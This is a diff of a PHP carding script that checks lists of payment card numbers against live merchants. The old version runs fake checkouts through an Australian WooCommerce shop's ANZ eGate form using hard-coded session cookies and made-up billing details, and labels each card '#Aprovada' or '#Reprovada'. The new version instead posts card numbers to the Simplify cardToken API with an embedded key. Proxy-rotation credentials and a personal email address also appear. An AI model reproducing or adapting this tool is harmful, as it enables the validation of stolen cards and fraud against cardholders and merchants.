@@ -146,11 +146,11 @@ $dbtime = substr(str_shuffle(str_repeat("0123456789", 20)), 0, 10);
 
 
 
-function updatecart(){
+// function updatecart(){
 
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.batteryyard.com.au/product/12sb0-8p/');
+curl_setopt($ch, CURLOPT_URL, 'https://api.simplify.com/v1/api/payment/cardToken');
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
@@ -165,136 +165,129 @@ curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-'accept-encoding: gzip, deflate, br',
-'accept-language: en-US,en;q=0.9',
-'content-type: multipart/form-data; boundary=----WebKitFormBoundarySH9aOqaBYaYnABvK',
-'cookie: PHPSESSID=992f5788186e2be59dcaf8b65b61cea6; wplc_chat_status=5; _icl_current_language=en; tk_ai=woo%3AFo7Me%2BnggNOX1raYXCavgVSa; nc_status=browsing; tcx_customerID=SJ0PrQLuCL; wp_woocommerce_session_9fc87226c25c378afe8b8a21d36d4df2=ee44954c74859f21239431caa72201bf%7C%7C1593669193%7C%7C1593665593%7C%7Cd4dd71bc5aad05b284bdae3c7f8fed70; wplc_cid=SJXRCIsK0I_1593583318130',
-'origin: https://www.batteryyard.com.au',
-'referer: https://www.batteryyard.com.au/product/12sb0-8p/',
+'Accept: */*',
+'Accept-Encoding: gzip, deflate, br',
+'Accept-Language: en-US,en;q=0.9',
+'Content-Type: application/json;charset=UTF-8',
+'Host: api.simplify.com',
+'Origin: https://api.simplify.com',
+'Referer: https://api.simplify.com/v1/api/payment/cardToken/proxy.html?xdm_e=https%3A%2F%2Faskebs.com.au&xdm_c=default5090&xdm_p=1',
 'user-agent: '.$browser.''
 ));
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundarySH9aOqaBYaYnABvK
-Content-Disposition: form-data; name="quantity"
-
-1
-------WebKitFormBoundarySH9aOqaBYaYnABvK
-Content-Disposition: form-data; name="add-to-cart"
-
-22941
-------WebKitFormBoundarySH9aOqaBYaYnABvK--');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"key":"lvpb_MzIzZGE4NWMtYWVkNC00YzU1LTg2ZTgtODg3MTExOWM3YWQ4","card":{"number":"'.$cc.'","cvc":"'.$ano.'","expMonth":'.$mes1.',"expYear":'.$ano.',"addressLine1":"12 avenue","addressLine2":"","addressCountry":"AU","addressState":"NSW","addressZip":"2150","addressCity":"Miami"},"source":"SIMPLIFYJS"}');
 
 
-$update = curl_exec($ch);
-}
-
+$b_pago = curl_exec($ch);
+// }
+$token = trim(strip_tags(getstr($b_pago,'"token":"','"')));
+echo $b_pago;
 //============================================================================================================================================================
 
-
-
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.batteryyard.com.au/?wc-ajax=checkout');
-
-//////////////////////// PROXY CALLS ////////////////////////////
-//               REMOVE '//' FOR PROXIES TO WORK BELOW
-
-//////////////////////// PROXYSCRAPE
-// curl_setopt($ch, CURLOPT_PROXY, '199.247.30.187:8080');
-// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
-//////////////////////// WEBSHARE
-// curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:1080');
-// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
-// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "vxrpebmq-rotate:a0fdakb6ts8a");
-
-//////////////////////// MANUAL Proxy List
-// curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
-// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);// CHANGE TYPE ACCORDING TO LIST
-
-//////////////////////// LUMINATI
-// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-// End Proxy Calls
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
- curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
-curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept: application/json, text/javascript, */*; q=0.01',
-'accept-encoding: gzip, deflate',
-'accept-language: en-US,en;q=0.9',
-'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: PHPSESSID=992f5788186e2be59dcaf8b65b61cea6; tk_ai=woo%3AFo7Me%2BnggNOX1raYXCavgVSa; tcx_customerID=SJ0PrQLuCL; wplc_chat_status=5; _icl_current_language=en; nc_status=browsing; wplc_cid=BybIJQUjRU_1593692894012; woocommerce_items_in_cart=1; wp_woocommerce_session_9fc87226c25c378afe8b8a21d36d4df2=7787a691d6f83ac0fd9c750074ed0092%7C%7C1593865778%7C%7C1593862178%7C%7C2f5341f2a53e696142181ceae281e2b7; woocommerce_cart_hash=3e5ad1f1a5c6fc62ea7d7d474b95980e',
-'origin: https://www.batteryyard.com.au',
-'referer: https://www.batteryyard.com.au/checkout/',
-'user-agent: '.$browser.'',
-));
-
-//////////////////////// START POST FILED 1 ////////////////////////
-
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Vincent&billing_last_name=Warner&billing_company=&billing_country=AU&billing_address_1=12+avenue&billing_address_2=&billing_city=Miami&billing_state=NSW&billing_postcode=2150&billing_phone=%2B615182641524&billing_email=pubgkittu%40gmail.com&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&shipping_method%5B0%5D=local_pickup%3A21&payment_method=anz_egate&anz_egate-card-number='.$cc1.''.$cc2.''.$cc3.''.$cc4.'&anz_egate-card-expiry='.$mes.'+%2F+'.$ano.'&anz_egate-card-cvc='.$cvv.'&woocommerce-process-checkout-nonce=136643446c&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
-
-// // // //*****************************************************************************************************************************************************************************************************************************************************************************
-$result = curl_exec($ch);
-if (curl_errno($ch)) {
-    echo 'Error:'.curl_error($ch);
-}
-curl_close($ch);
-
-
-
-
- // $token = trim(strip_tags(getstr($result,'<input name="__RequestVerificationToken" type="hidden" value="','" /></form>')));
-
-// echo $token;
-$message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\tPayment failed: ','\t\t<\/li>\n\t<\/ul>\n"')));
-// // $code = trim(strip_tags(getstr($result,'"message":"','"')));
-// // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));
-
-
-// //////////////////////// BIN INFO ////////////////////////////////
-// // $curl = curl_init();
-// // curl_setopt($curl, CURLOPT_URL, 'https://lookup.binlist.net/'.$binn.'');
-// // curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-// // curl_setopt($curl, CURLOPT_HTTPHEADER, array(
-// // 'Host: lookup.binlist.net',
-// // 'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
-// // 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
-// // ));
-// // curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
-// // curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
-// // curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
-// // curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
-// // curl_setopt($curl, CURLOPT_POSTFIELDS, '');
-// // $fim = curl_exec($curl);
-
-// // $bank = getStr($fim, '"bank":{"name":"','"');
-// // $pais = getStr($fim, '"name":"','"');
-// // $brand = getStr($fim, '"brand":"','"');
-// // $type = trim(strip_tags(getstr($fim,'"type":"','"')));
-
-if(strpos($result,'"result":"success"')){
-updatecart();
-      echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
-    }
-
-elseif(strpos($result,'Bad Request')) {
-
-            echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [E R R O R]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
-              }
-elseif(strpos($result,'Gateway Rejected: avs')) {
-
-    echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
-  }
-
-else {
-
-              echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
-
-
-  }
+//
+//
+// $ch = curl_init();
+// curl_setopt($ch, CURLOPT_URL, 'https://www.batteryyard.com.au/?wc-ajax=checkout');
+//
+// //////////////////////// PROXY CALLS ////////////////////////////
+// //               REMOVE '//' FOR PROXIES TO WORK BELOW
+//
+// //////////////////////// PROXYSCRAPE
+// // curl_setopt($ch, CURLOPT_PROXY, '199.247.30.187:8080');
+// // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+// //////////////////////// WEBSHARE
+// // curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:1080');
+// // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+// // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "vxrpebmq-rotate:a0fdakb6ts8a");
+//
+// //////////////////////// MANUAL Proxy List
+// // curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
+// // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);// CHANGE TYPE ACCORDING TO LIST
+//
+// //////////////////////// LUMINATI
+// // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
+// // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
+// // End Proxy Calls
+// curl_setopt($ch, CURLOPT_HEADER, 0);
+// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+// curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+//  curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
+// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+// 'accept: application/json, text/javascript, */*; q=0.01',
+// 'accept-encoding: gzip, deflate',
+// 'accept-language: en-US,en;q=0.9',
+// 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+// 'cookie: PHPSESSID=992f5788186e2be59dcaf8b65b61cea6; tk_ai=woo%3AFo7Me%2BnggNOX1raYXCavgVSa; tcx_customerID=SJ0PrQLuCL; wplc_chat_status=5; _icl_current_language=en; nc_status=browsing; wplc_cid=BybIJQUjRU_1593692894012; woocommerce_items_in_cart=1; wp_woocommerce_session_9fc87226c25c378afe8b8a21d36d4df2=7787a691d6f83ac0fd9c750074ed0092%7C%7C1593865778%7C%7C1593862178%7C%7C2f5341f2a53e696142181ceae281e2b7; woocommerce_cart_hash=3e5ad1f1a5c6fc62ea7d7d474b95980e',
+// 'origin: https://www.batteryyard.com.au',
+// 'referer: https://www.batteryyard.com.au/checkout/',
+// 'user-agent: '.$browser.'',
+// ));
+//
+// //////////////////////// START POST FILED 1 ////////////////////////
+//
+// curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Vincent&billing_last_name=Warner&billing_company=&billing_country=AU&billing_address_1=12+avenue&billing_address_2=&billing_city=Miami&billing_state=NSW&billing_postcode=2150&billing_phone=%2B615182641524&billing_email=pubgkittu%40gmail.com&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&shipping_method%5B0%5D=local_pickup%3A21&payment_method=anz_egate&anz_egate-card-number='.$cc1.''.$cc2.''.$cc3.''.$cc4.'&anz_egate-card-expiry='.$mes.'+%2F+'.$ano.'&anz_egate-card-cvc='.$cvv.'&woocommerce-process-checkout-nonce=136643446c&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
+//
+// // // // //*****************************************************************************************************************************************************************************************************************************************************************************
+// $result = curl_exec($ch);
+// if (curl_errno($ch)) {
+//     echo 'Error:'.curl_error($ch);
+// }
+// curl_close($ch);
+//
+//
+//
+//
+//  // $token = trim(strip_tags(getstr($result,'<input name="__RequestVerificationToken" type="hidden" value="','" /></form>')));
+//
+// // echo $token;
+// $message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\tPayment failed: ','\t\t<\/li>\n\t<\/ul>\n"')));
+// // // $code = trim(strip_tags(getstr($result,'"message":"','"')));
+// // // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));
+//
+//
+// // //////////////////////// BIN INFO ////////////////////////////////
+// // // $curl = curl_init();
+// // // curl_setopt($curl, CURLOPT_URL, 'https://lookup.binlist.net/'.$binn.'');
+// // // curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+// // // curl_setopt($curl, CURLOPT_HTTPHEADER, array(
+// // // 'Host: lookup.binlist.net',
+// // // 'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
+// // // 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
+// // // ));
+// // // curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
+// // // curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+// // // curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
+// // // curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
+// // // curl_setopt($curl, CURLOPT_POSTFIELDS, '');
+// // // $fim = curl_exec($curl);
+//
+// // // $bank = getStr($fim, '"bank":{"name":"','"');
+// // // $pais = getStr($fim, '"name":"','"');
+// // // $brand = getStr($fim, '"brand":"','"');
+// // // $type = trim(strip_tags(getstr($fim,'"type":"','"')));
+//
+// if(strpos($result,'"result":"success"')){
+// updatecart();
+//       echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
+//     }
+//
+// elseif(strpos($result,'Bad Request')) {
+//
+//             echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [E R R O R]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
+//               }
+// elseif(strpos($result,'Gateway Rejected: avs')) {
+//
+//     echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
+//   }
+//
+// else {
+//
+//               echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
+//
+//
+//   }
 curl_close($curl);
 ob_flush();
       // echo $result;
